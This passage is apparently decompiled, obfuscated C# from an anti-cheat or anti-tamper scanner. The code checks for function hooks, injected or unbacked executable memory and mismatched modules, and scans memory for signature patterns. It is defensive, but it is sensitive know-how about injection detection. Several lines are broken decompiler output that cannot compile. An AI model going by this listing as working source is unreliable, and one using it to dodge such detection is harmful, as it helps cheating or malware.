			this.AddToErrorLog(GEnum22.const_30, ex.ToString());
		}
	}

	// Token: 0x06000633 RID: 1587 RVA: 0x00060E14 File Offset: 0x0005F014
	private bool QueryProcessInfo(Process process_1, out long long_0)
	{
		long_0 = -1L;
		try
		{
			Process processInformation = GClass49.GetProcessInformation(process_1);
			if (processInformation != null)
			{
				string text = null;
				try
				{
					text = processInformation.MainModule.FileName;
				}
				catch (Win32Exception)
				{
					GClass49.TryGetFullProcessImageName(processInformation, out text);
				}
				if (text != null)
				{
					long_0 = this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_3, text, null, GEnum51.const_2);
				}
				return true;
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_29, ex.ToString());
		}
		return false;
	}

	// Token: 0x06000634 RID: 1588 RVA: 0x00060EA4 File Offset: 0x0005F0A4
	private void LogModuleChanges(Process process_1, GEnum48 genum48_0 = GEnum48.const_1)
	{
		IntPtr intPtr = IntPtr.Zero;
		if (process_1 == null)
		{
			return;
		}
		try
		{
			intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
			bool flag = GClass49.IsCurrentProcessElevated();
			string oldValue = Class15.ComposePath3().ToLowerInvariant();
			string newValue = Class15.ComposePath().ToLowerInvariant();
			foreach (object obj in process_1.Modules)
			{
				ProcessModule processModule = (ProcessModule)obj;
				this.HandleFileAccessRights(GEnum21.const_0, genum48_0, processModule.FileName, null, GEnum51.const_2);
				if (intPtr != IntPtr.Zero)
				{
					string mappedFileNameInfo = GClass45.GetMappedFileNameInfo(intPtr, processModule.BaseAddress);
					string text;
					if (mappedFileNameInfo == null)
					{
						text = string.Empty;
					}
					else
					{
						text = mappedFileNameInfo.ToLowerInvariant();
						if (flag)
						{
							text = text.Replace(oldValue, newValue);
						}
					}
					string text2 = Path.GetFullPath(processModule.FileName);
					text2 = text2.ToLowerInvariant();
					if (flag)
					{
						text2 = text2.Replace(oldValue, newValue);
					}
					if (text != text2)
					{
						bool flag2 = true;
						string string_;
						long long_;
						if (text.Length <= 0)
						{
							string_ = Class14.String_208 + Class14.String_9 + processModule.FileName;
							long_ = -1L;
						}
						else
						{
							string a = Class15.ExtractRelativePath(mappedFileNameInfo);
							string b = Class15.ExtractRelativePath(processModule.FileName);
							if (a == b && a != Class14.String_215)
							{
								flag2 = false;
								string_ = "";
								long_ = -1L;
							}
							else
							{
								string_ = mappedFileNameInfo + Class14.String_9 + processModule.FileName;
								long_ = this.HandleFileAccessRights(GEnum21.const_9, GEnum48.const_4, mappedFileNameInfo, null, GEnum51.const_2);
							}
						}
						if (flag2)
						{
							this.LogEvent(GEnum21.const_9, string_, -1, long_, GEnum23.const_0);
						}
					}
				}
			}
		}
		catch
		{
			this.SafeSetBool();
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				GClass45.CloseHandle(intPtr);
			}
		}
	}

	// Token: 0x06000635 RID: 1589 RVA: 0x000610E4 File Offset: 0x0005F2E4
	private void AnalyzeAndHandleFiles()
	{
		try
		{
			string string_ = Class14.String_73;
			string value = Class14.String_2;
			string string_2 = Class14.String_13;
			string string_3 = Class14.String_51;
			string string_4 = Class14.String_136;
			string string_5 = Class14.String_63;
			string string_6 = Class14.String_106;
			string[] array = Class15.FindFilesByPattern(this.gclass51_0.String_2, string_, true);
			if (array != null)
			{
				for (int i = 0; i < array.Length; i++)
				{
					try
					{
						string text = array[i].ToLower();
						if (!text.EndsWith(value) && !text.EndsWith(string_2) && !text.EndsWith(string_3) && !text.EndsWith(string_4) && !text.EndsWith(string_5) && !text.EndsWith(string_6))
						{
							if (GClass17.IsFileExecutable(array[i], false))
							{
								this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_2, array[i], null, GEnum51.const_2);
							}
						}
						else
						{
							this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_2, array[i], null, GEnum51.const_2);
						}
					}
					catch (Exception ex)
					{
						this.AddToErrorLog(GEnum22.const_25, ex.ToString());
					}
				}
			}
		}
		catch (Exception ex2)
		{
			this.AddToErrorLog(GEnum22.const_26, ex2.ToString());
		}
	}

	// Token: 0x06000636 RID: 1590 RVA: 0x0006121C File Offset: 0x0005F41C
	private void CollectFileDataMatchingPatterns()
	{
		try
		{
			string[] string_ = Class15.FindFilesByPattern(this.gclass51_0.String_2, Class14.String_159, true);
			this.GatherFileData(string_);
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_23, ex.ToString());
		}
		try
		{
			string[] string_2 = Class15.FindFilesByPattern(this.gclass51_0.String_2, Class14.String_219, true);
			this.GatherFileData(string_2);
		}
		catch (Exception ex2)
		{
			this.AddToErrorLog(GEnum22.const_23, ex2.ToString());
		}
	}

	// Token: 0x06000637 RID: 1591 RVA: 0x000612A8 File Offset: 0x0005F4A8
	private void CollectFileInfoFromPaths()
	{
		string[] string_ = Class14.String_57;
		for (int i = 0; i < string_.Length; i++)
		{
			string text = Path.Combine(this.gclass51_0.String_2, string_[i]);
			if (File.Exists(text))
			{
				string arg = Class15.CalculateMD5HashFromFile(text);
				string arg2 = Class15.ExtractRelativePath(text);
				text = string.Format(<Module>.DeserializeFromByteArray<string>(1995864001U), Path.GetFileName(string_[i]), arg, arg2);
				this.gclass51_0.List_2.Add(text);
			}
		}
		StringBuilder stringBuilder = new StringBuilder();
		foreach (string value in string_)
		{
			stringBuilder.Append(value);
		}
		this.gclass51_0.String_11 = Class15.MD5HashFromString(stringBuilder.ToString());
	}

	// Token: 0x06000638 RID: 1592 RVA: 0x00061370 File Offset: 0x0005F570
	private void GatherFileData(string[] string_6)
	{
		if (string_6 == null)
		{
			return;
		}
		try
		{
			string string_7 = Class14.String_61;
			int i = 0;
			while (i < string_6.Length)
			{
				long num = Class15.FileLineCount(string_6[i]);
				string fileName = Path.GetFileName(string_6[i]);
				bool flag = false;
				long num2 = -1L;
				int num3;
				try
				{
					string text = Class15.FileToString(string_6[i]);
					flag = Class15.HasSpecialChars(text);
					num3 = Class15.SubstringOccurrencesCount(text, string_7);
				}
				catch
				{
					num3 = -1;
				}
				try
				{
					IL_62:
					num2 = new FileInfo(string_6[i]).Length;
				}
				catch
				{
					num2 = -1L;
				}
				string item = string.Format(<Module>.DeserializeFromByteArray<string>(120389933U), new object[]
				{
					Class15.SanitizeString(fileName),
					Class15.CalculateMD5HashFromFile(string_6[i]),
					Class15.ExtractRelativePath(string_6[i]),
					flag ? <Module>.DeserializeFromByteArray2<string>(3165454329U) : <Module>.DeserealizeFromByteArrayV2_1<string>(1606687038U),
					num3,
					num,
					num2
				});
				this.gclass51_0.List_3.Add(item);
				i++;
				continue;
				goto IL_62;
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_22, ex.ToString());
		}
	}

	// Token: 0x06000639 RID: 1593 RVA: 0x000614F4 File Offset: 0x0005F6F4
	private IntPtr[] ProcessFunctionPointerOffsets(string[] string_6)
	{
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			IntPtr[] array = new IntPtr[string_6.Length];
			for (int i = 0; i < string_6.Length; i++)
			{
				array[i] = IntPtr.Zero;
			}
			string string_7 = Class14.String_176;
			intPtr = GClass45.LoadLibrary(string_7);
			if (intPtr != IntPtr.Zero)
			{
				ProcessModuleCollection modules = Process.GetCurrentProcess().Modules;
				IntPtr value = IntPtr.Zero;
				bool flag = GClass49.IsCurrentProcessElevated();
				string value2 = Class15.ComposePath().ToLower();
				string value3 = Class15.ComposePath3().ToLower();
				for (int j = 0; j < modules.Count; j++)
				{
					if (modules[j].ModuleName.ToLower() == string_7)
					{
						string text = modules[j].FileName.ToLower();
						if (text.Contains(value2) || (flag && text.Contains(value3)))
						{
							value = modules[j].BaseAddress;
							break;
						}
					}
				}
				if (value != IntPtr.Zero)
				{
					for (int k = 0; k < string_6.Length; k++)
					{
						try
						{
							IntPtr procAddress = GClass45.GetProcAddress(intPtr, string_6[k]);
							if (!(procAddress != IntPtr.Zero))
							{
								array[k] = procAddress;
							}
							else
							{
								array[k] = (IntPtr)(procAddress.ToInt64() - value.ToInt64());
							}
						}
						catch
						{
						}
					}
					return array;
				}
			}
		}
		catch (Win32Exception)
		{
			this.SafeSetBool();
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_40, ex.ToString());
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				GClass45.FreeLibrary(intPtr);
			}
		}
		return null;
	}

	// Token: 0x0600063A RID: 1594 RVA: 0x000616E8 File Offset: 0x0005F8E8
	private static ProcessModule LocateModuleByFileName(ProcessModuleCollection processModuleCollection_0, string string_6)
	{
		if (processModuleCollection_0 != null && string_6 != null)
		{
			string b = string_6.ToLower();
			for (int i = 0; i < processModuleCollection_0.Count; i++)
			{
				if (processModuleCollection_0[i].FileName.ToLower() == b)
				{
					return processModuleCollection_0[i];
				}
			}
			return null;
		}
		return null;
	}

	// Token: 0x0600063B RID: 1595 RVA: 0x0006173C File Offset: 0x0005F93C
	private bool InspectMemoryForInjection(Process process_1)
	{
		IntPtr intPtr = IntPtr.Zero;
		string[] string_ = Class14.String_45;
		bool result;
		try
		{
			intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
			if (!(intPtr == IntPtr.Zero))
			{
				IntPtr[] array = this.ProcessFunctionPointerOffsets(string_);
				if (array != null && array.Length != 0)
				{
					ProcessModuleCollection modules = process_1.Modules;
					IntPtr value = IntPtr.Zero;
					string string_2 = Class14.String_176;
					bool flag = GClass49.IsCurrentProcessElevated();
					string value2 = Class15.ComposePath().ToLower();
					string value3 = Class15.ComposePath3().ToLower();
					for (int i = 0; i < modules.Count; i++)
					{
						if (modules[i].ModuleName.ToLower() == string_2)
						{
							string text = modules[i].FileName.ToLower();
							if (text.Contains(value2) || (flag && text.Contains(value3)))
							{
								value = modules[i].BaseAddress;
								break;
							}
						}
					}
					if (value != IntPtr.Zero)
					{
						byte[] array2 = new byte[5];
						Array.Clear(array2, 0, array2.Length);
						uint num = 0U;
						for (int j = 0; j < string_.Length; j++)
						{
							if (!(array[j] == IntPtr.Zero))
							{
								IntPtr intptr_;
								try
								{
									intptr_ = (IntPtr)(value.ToInt64() + array[j].ToInt64());
								}
								catch (Exception ex)
								{
									string text2 = ex.ToString() + <Module>.DeserializeFromByteArray<string>(3617197183U) + string.Format(<Module>.DeserializeFromByteArray2<string>(3173772655U), value.ToString(<Module>.DeserializeFromByteArray<string>(3512701236U)), array[j].ToString(<Module>.DeserializeFromByteArray3<string>(1368342375U)));
									this.AddToErrorLog(GEnum22.const_39, text2);
									goto IL_319;
								}
								if (GClass45.ReadProcessMemory(intPtr, intptr_, array2, (uint)array2.Length, ref num) && (ulong)num == (ulong)((long)array2.Length))
								{
									if (array2[0] != 233)
									{
										if (array2[0] != 232)
										{
											if (array2[0] != 0)
											{
												goto IL_319;
											}
										}
									}
									IntPtr intPtr2 = (IntPtr)BitConverter.ToInt32(array2, 1);
									if (array2[0] == 233)
									{
										goto IL_219;
									}
									if (array2[0] == 232)
									{
										goto IL_219;
									}
									goto IL_324;
									IL_25A:
									string text2;
									GEnum48 genum48_;
									long long_;
									if (text2 != null && text2.Length > 0)
									{
										long_ = this.HandleFileAccessRights(GEnum21.const_2, genum48_, text2, null, GEnum51.const_2);
									}
									else
									{
										long_ = -1L;
									}
									string memoryRegionInfo = GClass49.GetMemoryRegionInfo(this.process_0, intPtr2);
									this.LogEvent(GEnum21.const_2, string.Concat(new string[]
									{
										string_[j].ToString(),
										<Module>.DeserializeFromByteArrayV2<string>(2747505432U),
										intPtr2.ToString(<Module>.DeserializeFromByteArray2<string>(1767388991U)),
										<Module>.DeserializeFromByteArray3<string>(4083566554U),
										array2[0].ToString(<Module>.DeserializeFromByteArray3<string>(1818832570U)),
										<Module>.DeserializeFromByteArray3<string>(4083566554U),
										memoryRegionInfo
									}), -1, long_, GEnum23.const_0);
									goto IL_319;
									IL_324:
									text2 = GClass49.CouldNotBeDecompiled(DealWithItLULZ)(process_1, intPtr2);
									if (text2 != null)
									{
										goto IL_23D;
									}
									text2 = GClass45.GetMappedFileNameInfo(intPtr, intPtr2);
									if (text2 == null)
									{
										text2 = string.Empty;
									}
									genum48_ = GEnum48.const_4;
									goto IL_25A;
									IL_219:
									try
									{
										intPtr2 = (IntPtr)(intptr_.ToInt32() + 5 + intPtr2.ToInt32());
										goto IL_324;
									}
									catch
									{
										goto IL_324;
									}
									IL_23D:
									genum48_ = GEnum48.const_1;
									goto IL_25A;
								}
							}
							IL_319:;
						}
					}
					return true;
				}
				if (!this.SafeGetBool())
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			else
			{
				result = false;
			}
		}
		catch (Exception ex2)
		{
			this.AddToErrorLog(GEnum22.const_38, ex2.ToString());
			return true;
		}
		finally
		{
			StringBuilder stringBuilder = new StringBuilder();
			foreach (string value4 in string_)
			{
				stringBuilder.Append(value4);
			}
			this.gclass51_0.String_12 = Class15.MD5HashFromString(stringBuilder.ToString());
			if (intPtr != IntPtr.Zero)
			{
				GClass45.CloseHandle(intPtr);
			}
		}
		return result;
	}

	// Token: 0x0600063C RID: 1596 RVA: 0x00061B74 File Offset: 0x0005FD74
	private bool SearchPatternInProcessMemory(Process process_1, bool bool_3 = false)
	{
		uint num = 0U;
		uint num2 = 0U;
		IntPtr intPtr = IntPtr.Zero;
		List<GClass40> list = null;
		try
		{
			list = GClass40.smethod_0(this.string_4);
		}
		catch
		{
			return false;
		}
		if (list != null && list.Count != 0)
		{
			try
			{
				intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
				if (intPtr == IntPtr.Zero)
				{
					return false;
				}
				GClass45.GStruct4 gstruct = default(GClass45.GStruct4);
				IntPtr intPtr2 = IntPtr.Zero;
				IntPtr intPtr3 = IntPtr.Zero;
				IntPtr intPtr4 = IntPtr.Zero;
				GClass45.GStruct5 gstruct2 = default(GClass45.GStruct5);
				GClass45.GetSystemInfo(ref gstruct2);
				intPtr2 = gstruct2.intptr_0;
				intPtr3 = gstruct2.intptr_1;
				int num3 = 100;
				foreach (GClass40 gclass in list)
				{
					if (gclass.Byte_0 != null && num3 < gclass.Byte_0.Length)
					{
						num3 = gclass.Byte_0.Length;
					}
					if (gclass.String_0 != null && num3 < gclass.String_0.Length)
					{
						num3 = gclass.String_0.Length;
					}
				}
				bool flag = false;
				uint num4 = gstruct2.uint_1;
				if (num4 == 0U)
				{
					num4 = 4096U;
				}
				num2 = num4;
				byte[] array = new byte[num2];
				while (intPtr2.ToInt64() < intPtr3.ToInt64() && !this.SafeGetBool() && GClass45.VirtualQueryEx(intPtr, intPtr2, out gstruct, Marshal.SizeOf(gstruct)) > 0 && gstruct.intptr_2.ToInt64() != 0L)
				{
					intPtr4 = (IntPtr)(intPtr2.ToInt64() + gstruct.intptr_2.ToInt64());
					if (GClass49.CanExecuteCodeInMemory(gstruct))
					{
						uint num5 = GClass49.SetFlagBits(gstruct.uint_2);
						if (gstruct.uint_3 == 16777216U)
						{
							if (gstruct.uint_2 == 64U)
							{
								goto IL_241;
							}
							if (gstruct.uint_2 == 16U && gstruct.intptr_2.ToInt64() <= 65535L)
							{
								goto IL_241;
							}
							if ((num5 & 4U) != 4U && (num5 & 8U) != 8U && (num5 & 2U) == 2U)
							{
								goto IL_241;
							}
						}
						if (gstruct.uint_3 != 262144U)
						{
							if (gstruct.uint_3 != 131072U)
							{
								goto IL_659;
							}
						}
						if ((num5 & 8U) != 8U)
						{
							goto IL_659;
						}
						IL_241:
						IntPtr intPtr5 = intPtr2;
						IntPtr intPtr6 = intPtr5;
						num2 = num4;
						for (;;)
						{
							if (intPtr5.ToInt64() + (long)((ulong)num2) >= intPtr4.ToInt64())
							{
								num2 = (uint)(intPtr4.ToInt64() - intPtr5.ToInt64());
								Array.Clear(array, 0, array.Length);
							}
							if (!GClass45.ReadProcessMemory(intPtr, intPtr5, array, num2, ref num) || num <= 0U)
							{
								break;
							}
							try
							{
								int num6 = 0;
								foreach (GClass40 gclass2 in list)
								{
									if ((gclass2.GEnum20_0 & GEnum20.const_1) == GEnum20.const_1)
									{
										if ((gclass2.GEnum20_0 & GEnum20.const_3) == GEnum20.const_3)
										{
											int num7 = Class15.SearchBytePattern(array, gclass2.Byte_0, gclass2.String_0, 0, 0);
											if (num7 >= 0)
											{
												bool flag2 = (gclass2.GEnum20_0 & GEnum20.const_5) == GEnum20.const_5;
												GEnum21 genum = GEnum21.const_1;
												if (flag2)
												{
													genum |= GEnum21.const_21;
												}
												string text = GClass49.CouldNotBeDecompiled(DealWithItLULZ)(process_1, gstruct.intptr_0);
												GEnum48 genum48_;
												if (text != null)
												{
													genum48_ = GEnum48.const_1;
												}
												else
												{
													text = GClass45.GetMappedFileNameInfo(intPtr, gstruct.intptr_0);
													if (text == null)
													{
														text = string.Empty;
													}
													genum48_ = GEnum48.const_4;
												}
												long long_;
												if (text != null && text.Length > 0)
												{
													long_ = this.HandleFileAccessRights(genum, genum48_, text.ToString(), null, GEnum51.const_2);
												}
												else
												{
													long_ = -1L;
												}
												string memoryRegionInfo = GClass49.GetMemoryRegionInfo(process_1, gstruct.intptr_0);
												string text2 = Convert.ToBase64String(gclass2.Byte_0);
												string text3 = (intPtr5.ToInt32() + num7).ToString(<Module>.DeserializeFromByteArray3<string>(1368342375U));
												string text4 = string.Empty;
												try
												{
													byte[] array2 = new byte[gclass2.Byte_0.Length];
													Array.Copy(array, num7, array2, 0, array2.Length);
													text4 = <Module>.DeserializeFromByteArray2<string>(3237939336U) + Convert.ToBase64String(array2);
													goto IL_3F6;
												}
												catch
												{
													goto IL_3F6;
												}
												goto IL_3EB;
												IL_3F6:
												this.LogEvent(genum, string.Concat(new string[]
												{
													memoryRegionInfo,
													<Module>.DeserializeFromByteArray2<string>(3237939336U),
													text2,
													<Module>.DeserializeFromByteArray3<string>(1710627408U),
													text3,
													text4
												}), num6, long_, GEnum23.const_0);
												if (!flag2)
												{
													flag = true;
													break;
												}
											}
											IL_3EB:
											num6++;
											continue;
										}
									}
									num6++;
								}
								if (flag)
								{
									break;
								}
								string text5 = Encoding.UTF8.GetString(array).Replace(<Module>.DeserializeFromByteArray2<string>(1964951788U), "").ToLowerInvariant();
								num6 = 0;
								foreach (GClass40 gclass3 in list)
								{
									if ((gclass3.GEnum20_0 & GEnum20.const_2) == GEnum20.const_2)
									{
										if ((gclass3.GEnum20_0 & GEnum20.const_3) == GEnum20.const_3)
										{
											int num7 = text5.IndexOf(gclass3.String_0, StringComparison.Ordinal);
											if (num7 > -1)
											{
												bool flag3 = (gclass3.GEnum20_0 & GEnum20.const_5) == GEnum20.const_5;
												GEnum21 genum = GEnum21.const_1;
												if (flag3)
												{
													genum |= GEnum21.const_21;
												}
												string text6 = GClass49.CouldNotBeDecompiled(DealWithItLULZ)(process_1, gstruct.intptr_0);
												GEnum48 genum48_;
												if (text6 != null)
												{
													genum48_ = GEnum48.const_1;
												}
												else
												{
													text6 = GClass45.GetMappedFileNameInfo(intPtr, gstruct.intptr_0);
													if (text6 == null)
													{
														text6 = string.Empty;
													}
													genum48_ = GEnum48.const_4;
												}
												long long_;
												if (text6 != null && text6.Length > 0)
												{
													long_ = this.HandleFileAccessRights(genum, genum48_, text6.ToString(), null, GEnum51.const_2);
												}
												else
												{
													long_ = -1L;
												}
												string memoryRegionInfo2 = GClass49.GetMemoryRegionInfo(process_1, gstruct.intptr_0);
												this.LogEvent(genum, memoryRegionInfo2 + <Module>.DeserializeFromByteArray<string>(3617197183U) + gclass3.String_0.Trim().Trim(new char[]
												{
													'\n'
												}).Trim(new char[1]), num6, long_, GEnum23.const_0);
												if (!flag3)
												{
													flag = true;
													break;
												}
											}
											num6++;
											continue;
										}
									}
									num6++;
								}
								goto IL_662;
							}
							catch
							{
								goto IL_662;
							}
							IL_5EC:
							intPtr6 = (IntPtr)(intPtr6.ToInt64() + (long)((ulong)num2));
							intPtr5 = (IntPtr)(intPtr6.ToInt64() - (long)num3);
							if ((ulong)num2 == (ulong)((long)num3))
							{
								break;
							}
							if (intPtr5.ToInt64() >= intPtr4.ToInt64())
							{
								break;
							}
							if (this.SafeGetBool())
							{
								break;
							}
							continue;
							IL_662:
							if (!flag)
							{
								goto IL_5EC;
							}
							break;
						}
						IL_655:
						if (!flag)
						{
							goto IL_659;
						}
						break;
						goto IL_655;
					}
					IL_659:
					intPtr2 = intPtr4;
				}
			}
			catch (Exception ex)
			{
				this.AddToErrorLog(GEnum22.const_24, ex.ToString());
			}
			finally
			{
				StringBuilder stringBuilder = new StringBuilder();
				foreach (GClass40 gclass4 in list)
				{
					stringBuilder.Append(gclass4.String_0);
					if ((gclass4.GEnum20_0 & GEnum20.const_1) == GEnum20.const_1)
					{
						stringBuilder.Append(Convert.ToBase64String(gclass4.Byte_0));
					}
				}
				this.gclass51_0.String_13 = Class15.MD5HashFromString(stringBuilder.ToString());
				if (intPtr != IntPtr.Zero)
				{
					GClass45.CloseHandle(intPtr);
				}
			}
			return true;
		}
		return false;
	}

	// Token: 0x0600063D RID: 1597 RVA: 0x00062378 File Offset: 0x00060578
	private bool ScanAndLogExecutableMemoryRegions(Process process_1, bool bool_3 = false)
	{
		IntPtr intPtr = IntPtr.Zero;
		GClass45.GStruct4 gstruct = default(GClass45.GStruct4);
		IntPtr intPtr2 = IntPtr.Zero;
		GClass45.GStruct5 gstruct2 = default(GClass45.GStruct5);
		GClass45.GetSystemInfo(ref gstruct2);
		IntPtr intptr_ = gstruct2.intptr_0;
		IntPtr intptr_2 = gstruct2.intptr_1;
		GEnum48 genum = GEnum48.const_4;
		GEnum23 genum23_;
		if (bool_3)
		{
			genum |= GEnum48.const_5;
			genum23_ = GEnum23.const_22;
		}
		else
		{
			genum23_ = GEnum23.const_0;
		}
		intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
		if (!(intPtr == IntPtr.Zero))
		{
			List<MAIN.Class18> list = new List<MAIN.Class18>();
			while (GClass45.VirtualQueryEx(intPtr, intptr_, out gstruct, Marshal.SizeOf(gstruct)) != 0 && !this.SafeGetBool() && intptr_.ToInt64() < intptr_2.ToInt64() && gstruct.intptr_2.ToInt64() != 0L)
			{
				if (GClass49.CanExecuteCodeInMemory(gstruct))
				{
					uint num;
					intPtr2 = GClass49.GetNextMemoryRegionAddress(process_1, intPtr, gstruct.intptr_0, out num, true);
					if (gstruct.uint_3 == 16777216U)
					{
						string mappedFileNameInfo = GClass45.GetMappedFileNameInfo(intPtr, gstruct.intptr_0);
						if (mappedFileNameInfo != null && mappedFileNameInfo != "")
						{
							MAIN.Class18 @class = MAIN.Class18.smethod_0(list, mappedFileNameInfo);
							if (@class != null)
							{
								string memoryRegionInfo = GClass49.GetMemoryRegionInfo(process_1, gstruct.intptr_0);
								string memoryRegionInfo2 = GClass49.GetMemoryRegionInfo(process_1, @class.IntPtr_0);
								string string_ = string.Format(<Module>.DeserializeFromByteArray2<string>(2352628090U), memoryRegionInfo, Class15.char_0, memoryRegionInfo2);
								this.LogEvent(GEnum21.const_20, string_, -1, -1L, genum23_);
							}
							else
							{
								list.Add(new MAIN.Class18(mappedFileNameInfo, gstruct.intptr_0, intPtr2));
							}
						}
					}
					if (intptr_.ToInt64() == intPtr2.ToInt64())
					{
						intptr_ = (IntPtr)(intptr_.ToInt64() + gstruct.intptr_2.ToInt64());
					}
					else
					{
						intptr_ = intPtr2;
					}
				}
				else
				{
					intptr_ = (IntPtr)(intptr_.ToInt64() + gstruct.intptr_2.ToInt64());
				}
			}
			GClass45.CloseHandle(intPtr);
			return true;
		}
		return false;
	}

	// Token: 0x0600063E RID: 1598
	private bool InspectProcessMemoryRegions(Process process_1, bool bool_3 = false, bool bool_4 = false)
	{
		IntPtr intPtr = IntPtr.Zero;
		GClass45.GStruct4 gstruct = default(GClass45.GStruct4);
		IntPtr intPtr2 = IntPtr.Zero;
		IntPtr intptr_ = IntPtr.Zero;
		GClass45.GStruct5 gstruct2 = default(GClass45.GStruct5);
		GClass45.GetSystemInfo(ref gstruct2);
		IntPtr intptr_2 = gstruct2.intptr_0;
		IntPtr intptr_3 = gstruct2.intptr_1;
		GEnum48 genum = GEnum48.const_4;
		GEnum23 genum23_ = GEnum23.const_0;
		if (!bool_3)
		{
			genum23_ = GEnum23.const_0;
		}
		else
		{
			genum |= GEnum48.const_5;
			genum23_ = GEnum23.const_22;
		}
		intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
		if (!(intPtr == IntPtr.Zero))
		{
			uint num = 32U;
			uint num2 = gstruct2.uint_1;
			if (num2 == 0U)
			{
				num2 = 4096U;
			}
			new byte[num * num2];
			while (GClass45.VirtualQueryEx(intPtr, intptr_2, out gstruct, Marshal.SizeOf(gstruct)) != 0 && !this.SafeGetBool() && intptr_2.ToInt64() < intptr_3.ToInt64() && gstruct.intptr_2.ToInt64() != 0L)
			{
				if (!GClass49.CanExecuteCodeInMemory(gstruct))
				{
					intptr_2 = (IntPtr)(intptr_2.ToInt64() + gstruct.intptr_2.ToInt64());
				}
				else if (gstruct.uint_3 == 16777216U)
				{
					uint uint_;
					intPtr2 = GClass49.GetNextMemoryRegionAddress(process_1, intPtr, gstruct.intptr_0, out uint_, true);
					if (intPtr2 != IntPtr.Zero)
					{
						string mappedFileNameInfo = GClass45.GetMappedFileNameInfo(intPtr, gstruct.intptr_0);
						if (mappedFileNameInfo != null && mappedFileNameInfo.Length != 0)
						{
							if (mappedFileNameInfo.Length > 0 && (GClass49.HasFlag(uint_) || (!bool_4 && GClass17.smethod_5(intPtr, gstruct.intptr_0)) || !GClass17.smethod_1(intPtr, gstruct.intptr_0)) && !GClass49.ModuleExistsAtAddress(process_1, gstruct.intptr_0) && !GClass49.IsElevatedProcessWithMatchingSystemPath(mappedFileNameInfo))
							{
								long long_ = this.HandleFileAccessRights(GEnum21.const_5, genum, mappedFileNameInfo.ToString(), null, GEnum51.const_1);
								string memoryRegionInfo = GClass49.GetMemoryRegionInfo(process_1, gstruct.intptr_0);
								this.LogEvent(GEnum21.const_5, memoryRegionInfo, -1, long_, genum23_);
							}
						}
						else
						{
							string memoryRegionInfo2 = GClass49.GetMemoryRegionInfo(process_1, gstruct.intptr_0);
							this.LogEvent(GEnum21.const_14, memoryRegionInfo2, -1, -1L, genum23_);
						}
					}
					if (intptr_2.ToInt64() == intPtr2.ToInt64())
					{
						intptr_2 = (IntPtr)(intptr_2.ToInt64() + gstruct.intptr_2.ToInt64());
					}
					else
					{
						intptr_2 = intPtr2;
					}
				}
				else
				{
					if (gstruct.uint_3 == 262144U && (GClass49.HasFlag(gstruct.uint_2) || (!bool_4 && GClass17.smethod_5(intPtr, gstruct.intptr_0))))
					{
						string mappedFileNameInfo2 = GClass45.GetMappedFileNameInfo(intPtr, gstruct.intptr_0);
						if (GClass17.smethod_1(intPtr, gstruct.intptr_0))
						{
							long long_;
							if (mappedFileNameInfo2 != null && mappedFileNameInfo2.Length > 0)
							{
								long_ = this.HandleFileAccessRights(GEnum21.const_6, genum, mappedFileNameInfo2.ToString(), null, GEnum51.const_2);
							}
							else
							{
								long_ = -1L;
							}
							string memoryRegionInfo3 = GClass49.GetMemoryRegionInfo(process_1, gstruct.intptr_0);
							this.LogEvent(GEnum21.const_6, memoryRegionInfo3, -1, long_, genum23_);
						}
						else
						{
							if (mappedFileNameInfo2 != null && mappedFileNameInfo2.Length > 0)
							{
								try
								{
									if (GClass17.IsFileExecutable(mappedFileNameInfo2.ToString(), false))
									{
										long long_ = this.HandleFileAccessRights(GEnum21.const_8, genum, mappedFileNameInfo2.ToString(), null, GEnum51.const_2);
										string memoryRegionInfo4 = GClass49.GetMemoryRegionInfo(process_1, gstruct.intptr_0);
										this.LogEvent(GEnum21.const_7, memoryRegionInfo4, -1, long_, genum23_);
									}
									goto IL_47D;
								}
								catch
								{
									goto IL_47D;
								}
							}
							string memoryRegionInfo5 = GClass49.GetMemoryRegionInfo(process_1, gstruct.intptr_0);
							this.LogEvent(GEnum21.const_6, memoryRegionInfo5, -1, -1L, genum23_);
						}
					}
					else if (gstruct.uint_3 == 131072U)
					{
						if (GClass17.smethod_1(intPtr, gstruct.intptr_0) && (GClass49.HasFlag(gstruct.uint_2) || (!bool_4 && GClass17.smethod_5(intPtr, gstruct.intptr_0))))
						{
							string memoryRegionInfo6 = GClass49.GetMemoryRegionInfo(process_1, gstruct.intptr_0);
							this.LogEvent(GEnum21.const_8, memoryRegionInfo6, -1, -1L, genum23_);
						}
						else if (gstruct.uint_2 == 2U)
						{
							if (GClass17.smethod_1(intPtr, gstruct.intptr_0))
							{
								intptr_ = (IntPtr)(intptr_2.ToInt64() + gstruct.intptr_2.ToInt64());
								if (GClass49.IsMemoryProtected(intPtr, intptr_))
								{
									string memoryRegionInfo7 = GClass49.GetMemoryRegionInfo(process_1, gstruct.intptr_0);
									this.LogEvent(GEnum21.const_8, memoryRegionInfo7, -1, -1L, genum23_);
								}
							}
						}
					}
					IL_47D:
					uint uint_;
					intPtr2 = GClass49.GetNextMemoryRegionAddress(process_1, intPtr, gstruct.intptr_0, out uint_, true);
					if (intptr_2.ToInt64() == intPtr2.ToInt64())
					{
						intptr_2 = (IntPtr)(intptr_2.ToInt64() + gstruct.intptr_2.ToInt64());
					}
					else
					{
						intptr_2 = intPtr2;
					}
				}
			}
			GClass45.CloseHandle(intPtr);
			return true;
		}
		return false;
	}

	// Token: 0x0600063F RID: 1599
	private IntPtr QueryThreadStackBase(int int_2)
	{
		IntPtr result = IntPtr.Zero;
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			intPtr = GClass45.OpenThread(8U, false, (uint)int_2);
			if (intPtr == IntPtr.Zero)
			{
				return result;
			}
			GClass45.GStruct12 gstruct = default(GClass45.GStruct12);
			gstruct.uint_0 = 65543U;
			if (GClass45.GetThreadContext(intPtr, ref gstruct))
			{
